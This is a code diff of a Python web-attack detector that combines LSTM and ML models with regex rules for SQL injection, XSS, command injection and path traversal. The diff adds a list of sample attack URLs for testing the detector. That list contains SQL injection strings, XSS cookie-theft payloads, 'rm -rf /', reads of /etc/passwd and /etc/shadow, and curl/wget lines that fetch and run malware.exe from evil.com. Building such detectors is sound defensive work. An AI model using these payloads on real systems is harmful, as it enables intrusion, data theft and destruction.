@@ -1,180 +1,191 @@
 from __future__ import print_function
+from sklearn.feature_extraction.text import CountVectorizer
+from urllib.parse import urlparse, unquote
+from store import SQL_KEYWORDS, SQL_REGEX ,UNIX_ALIASES,PATH_TRAVERSAL_REGEX
+import tensorflow as tf
 import re
 import pickle
-from sklearn.feature_extraction.text import CountVectorizer
-from urllib.parse import urlparse,unquote
 import numpy as np
 import string
 import os
+import json
+from urllib.parse import urlparse, parse_qs
 os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
-import tensorflow as tf
 
 # laoding main  model of detection
 CURRENT_DIR = os.path.dirname(os.path.dirname(__file__))
-MODEL_PATH = os.path.join(CURRENT_DIR, 'models' ,'lstm_final.h5')
-MODEL=tf.keras.models.load_model(MODEL_PATH)
-CONFIG= MODEL.get_config()
-LENGTH=CONFIG["layers"][0]["config"]["batch_input_shape"][1]
+MODEL_PATH = os.path.join(CURRENT_DIR, 'models', 'cnn_lstm_final.h5')
+MODEL = tf.keras.models.load_model(MODEL_PATH)
+CONFIG = MODEL.get_config()
+LENGTH = CONFIG["layers"][0]["config"]["batch_input_shape"][1]
 
-class AnomalyDetect(): 
+
+class AnomalyDetect():
     def __init__(self):
         pass
-     
-    def string_to_index(self,str_request,dictionary):
-        index_request=np.zeros(len(str_request))
+
+    def string_to_index(self, str_request, dictionary):
+        index_request = np.zeros(len(str_request))
         for i in range(len(str_request)):
             try:
-                index_request[i]=dictionary[str_request[i]]
+                index_request[i] = dictionary[str_request[i]]
             except KeyError:
                 pass
-        return tf.convert_to_tensor(index_request,dtype=tf.int32)
+        return tf.convert_to_tensor(index_request, dtype=tf.int32)
 
     def create_dict(self):
-        dictionary={}
-        alphabet=string.ascii_lowercase+string.digits+string.punctuation+' '
+        dictionary = {}
+        alphabet = string.ascii_lowercase+string.digits+string.punctuation+' '
         for i in range(len(alphabet)):
-            dictionary[alphabet[i]]=i
+            dictionary[alphabet[i]] = i
         return dictionary
-    
-    def predict(self,payload):
-        #loading model
-        dictionary= self.create_dict()
-        payload = self.string_to_index(payload,dictionary)
-        data=[payload]
-        data=tf.keras.preprocessing.sequence.pad_sequences(data,padding='post',maxlen=LENGTH)
+
+    def predict(self, payload):
+        # loading model
+        dictionary = self.create_dict()
+        payload = self.string_to_index(payload, dictionary)
+        data = [payload]
+        data = tf.keras.preprocessing.sequence.pad_sequences(
+            data, padding='post', maxlen=LENGTH)
         return MODEL.predict(data).round()[0] == 1
-    
 
 class SQLIDetect():
 
-    SQL_KEYWORDS=[
-        'TABLE',
-        'TABLESPACE',
-        'PROCEDURE',
-        'FUNCTION',
-        'TRIGGER',
-        'KEY',
-        'VIEW',
-        'MATERIALIZED VIEW',   
-        'LIBRARYDATABASE LINK',
-        'DBLINK',
-        'INDEX',
-        'CONSTRAINT',
-        'TRIGGER',
-        'USER',
-        'SCHEMA',
-        'DATABASE',
-        'PLUGGABLE DATABASE',
-        'BUCKET',
-        'CLUSTER',
-        'COMMENT',
-        'SYNONYM',
-        'TYPE',
-        'JAVA',
-        'SESSION',
-        'ROLE',
-        'PACKAGE',
-        'PACKAGE BODY',
-        'OPERATORSEQUENCE',
-        'RESTORE POINT',
-        'PFILE',
-        'CLASS',
-        'CURSOR',
-        'OBJECT',
-        'RULE',
-        'USER',
-        'DATASET',
-        'DATASTORE',
-        'COLUMN',
-        'FIELD',
-        'OPERATOR',
-        'SHUTDOWN',
-    ]
-
-    SQL_REGEX=[
-        "(?i)(.*)(\\b)+(OR|AND)(\\s)+(true|false)(\\s)*(.*)",
-        "(?i)(.*)(\\b)+(OR|AND)(\\s)+(\\w)(\\s)*(\\=)(\\s)*(\\w)(\\s)*(.*)",
-        "(?i)(.*)(\\b)+(OR|AND)(\\s)+(equals|not equals)(\\s)+(true|false)(\\s)*(.*)",
-        "(?i)(.*)(\\b)+(OR|AND)(\\s)+([0-9A-Za-z_'][0-9A-Za-z\\d_']*)(\\s)*(\\=)(\\s)*([0-9A-Za-z_'][0-9A-Za-z\\d_']*)(\\s)*(.*)",
-        "(?i)(.*)(\\b)+(OR|AND)(\\s)+([0-9A-Za-z_'][0-9A-Za-z\\d_']*)(\\s)*(\\!\\=)(\\s)*([0-9A-Za-z_'][0-9A-Za-z\\d_']*)(\\s)*(.*)",
-        "(?i)(.*)(\\b)+(OR|AND)(\\s)+([0-9A-Za-z_'][0-9A-Za-z\\d_']*)(\\s)*(\\<\\>)(\\s)*([0-9A-Za-z_'][0-9A-Za-z\\d_']*)(\\s)*(.*)",
-        "(?i)(.*)(\\b)+SELECT(\\b)+\\s.*(\\b)(.*)",
-        "(?i)(.*)(\\b)+SELECT(\\b)+\\s.*(\\b)+FROM(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+INSERT(\\b)+\\s.*(\\b)+INTO(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+UPDATE(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+DELETE(\\b)+\\s.*(\\b)+FROM(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+UPSERT(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+SAVEPOINT(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+CALL(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+ROLLBACK(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+KILL(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+DROP(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+CREATE(\\b)+(\\s)*(" + "|".join(SQL_KEYWORDS) + ")(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+ALTER(\\b)+(\\s)*(" +  "|".join(SQL_KEYWORDS) + ")(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+TRUNCATE(\\b)+(\\s)*(" +  "|".join(SQL_KEYWORDS) + ")(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+LOCK(\\b)+(\\s)*(" +  "|".join(SQL_KEYWORDS) + ")(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+UNLOCK(\\b)+(\\s)*(" +  "|".join(SQL_KEYWORDS) + ")(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+RELEASE(\\b)+(\\s)*(" +  "|".join(SQL_KEYWORDS) + ")(\\b)+\\s.*(.*)",
-        "(?i)(.*)(\\b)+DESC(\\b)+(\\w)*\\s.*(.*)",
-        "(?i)(.*)(\\b)+DESCRIBE(\\b)+(\\w)*\\s.*(.*)",
-        "(.*)(/\\*|\\*/|;){1,}(.*)",
-        "(.*)(-){2,}(.*)",
-    ]
     def __init__(self):
         pass
     # detection of SQL injection using pattern matching
     # payload: the statement to be checked
     # The function returns True if the statement is a SQL injection, False otherwise
+
     def Regex_detect(self, payload):
         if payload.strip() == "":
             return False
 
-        for pattern in self.SQL_REGEX:
-            if re.search(pattern,payload,flags=re.IGNORECASE|re.UNICODE):
+        for pattern in SQL_REGEX:
+            if re.search(pattern, payload, flags=re.IGNORECASE | re.UNICODE):
                 return True
         return False
     # detection of SQL injection using machine learning
+
     def ML_detect(self, payload):
         with open('../models/sqli_model.pkl', 'rb') as f:
-            model,vectorizer = pickle.load(f)
-        data=vectorizer.transform([payload])
-        return model.predict(data).round()[0]==1
+            model, vectorizer = pickle.load(f)
+        data = vectorizer.transform([payload])
+        return model.predict(data).round()[0] == 1
     # this function checks if the patterns are valid
+
     def check_patterns(self):
-        for pattern in self.SQL_REGEX:
+        for pattern in SQL_REGEX:
             if not re.compile(pattern):
                 return False
         return True
-    
+
 class XSSDetect():
     def __init__(self):
         pass
     # detection of XSS using Machine Learning
+
     def ML_detect(self, payload):
         with open('../models/xss_model.pkl', 'rb') as f:
-            model,vectorizer = pickle.load(f)
-        data=vectorizer.transform([payload])
+            model, vectorizer = pickle.load(f)
+        data = vectorizer.transform([payload])
         return model.predict(data).round()[0] == 1
+
+class CMDiDetect():
+    def __init__(self):
+        pass
+    # detection of Command injection
+    def Detect(self, payload):
+        if payload.strip() == "":
+            return False
+
+        cmdi_regex = r'.*(;|\||&&|\n)( |)('+"|".join(UNIX_ALIASES)+').*$'
+        if re.search(cmdi_regex, payload, flags=re.IGNORECASE | re.UNICODE):
+            return True
+        return False
+
 
 
 def isAnomalous(payload):
-    anomalyDetect=AnomalyDetect()
+    anomalyDetect = AnomalyDetect()
     return anomalyDetect.predict(payload)
+
+
 def getAttackType(payload):
-    sqli=SQLIDetect()
-    xss=XSSDetect()
-    if sqli.Regex_detect(payload) or sqli.ML_detect(payload):
-        return "SQLi"
+    sqli = SQLIDetect()
+    xss = XSSDetect()
+    cmdi = CMDiDetect()
+    
+    if cmdi.Detect(payload):
+        return "CMDi"
     elif xss.ML_detect(payload):
         return "XSS"
+    elif re.search(PATH_TRAVERSAL_REGEX, payload, flags=re.IGNORECASE | re.UNICODE):
+        return "PATH TRAVEL"
+    elif sqli.ML_detect(payload):
+        return "SQLi"
     else:
         return "Suspicious"
 
+urls = urls = [
+    # SQL Injection
+    "/search.php?q=test'",
+    "/index.php?id=1'",
+    "/product.php?id=1'",
+    "/category.php?id=1'",
+    "/news.php?id=1'",
+    "/blog.php?id=1'",
+    "/faq.php?id=1'",
+    "/view.php?id=1'",
+    "/login.php?username=admin' OR 1=1 --",
+    "/search.php?q=test'; DROP TABLE users; --",
+    "/index.php?id=1 UNION SELECT 1,2,3,4,5 ;--",
+    "/product.php?id=1; UPDATE products SET price=0 WHERE id=1; --",
+    "/category.php?id=1 AND (SELECT COUNT(*) FROM users)=0;--",
 
-payload="/dvwa/vulnerabilities/exec?"
-print(payload)
-if isAnomalous(payload):
-    print("Anomaly detected")
-    print(f"attack type:{getAttackType(payload)}")
-else:
-    print("No anomaly detected")
+    # Cross-Site Scripting
+    "/search.php?q=<script>alert('XSS')</script>",
+    "/index.php?id=<script>alert('XSS')</script>",
+    "/product.php?id=<script>alert('XSS')</script>",
+    "/category.php?id=<script>alert('XSS')</script>",
+    "/news.php?id=<script>alert('XSS')</script>",
+    "/blog.php?id=<script>alert('XSS')</script>",
+    "/faq.php?id=<script>alert('XSS')</script>",
+    "/view.php?id=<script>alert('XSS')</script>",
+    "/login.php?username=<script>alert('XSS')</script>",
+    "/search.php?q=<img src='x' onerror='alert(document.cookie)'/>",
+
+    # Command Injection
+    "/search.php?q=test; ping 127.0.0.1",
+    "/index.php?id=1; ls -la",
+    "/product.php?id=1; cat /etc/passwd",
+    "/category.php?id=1; rm -rf /",
+    "/news.php?id=1; net user",
+    "/blog.php?id=1; whoami",
+    "/faq.php?id=1; curl http://evil.com/malware.exe | bash",
+    "/view.php?id=1; wget http://evil.com/malware.exe -O /tmp/malware.exe && chmod +x /tmp/malware.exe && /tmp/malware.exe",
+    "/login.php?username=admin' OR 1=1; net user",
+    "/search.php?ip=ping%20-c%204%208.8.8.8;id&Submit=Submit",
+    
+    # Path Traversal
+    "/download.php?file=../../../etc/passwd",
+    "/view.php?file=../../../../etc/passwd",
+    "/read.php?file=..%2f..%2f..%2fetc%2fpasswd",
+    "/file.php?name=../../etc/passwd",
+    "/download.php?file=..%2f..%2f..%2fetc%2fshadow",
+    "/view.php?file=../../../etc/shadow",
+    "/read.php?file=..%2f..%2f..%2fetc%2fshadow",
+    "/file.php?name=../../etc/shadow",
+]
+
+with open("file.txt","w") as f:
+
+    for payload in urls:
+        f.write(payload + "\n")
+        if isAnomalous(payload):
+            f.write(f"attack type:{getAttackType(payload)}")
+        else:
+            f.write("No anomaly detected")
+        f.write("\n")
+        f.write("-"*100)
+        f.write("\n")
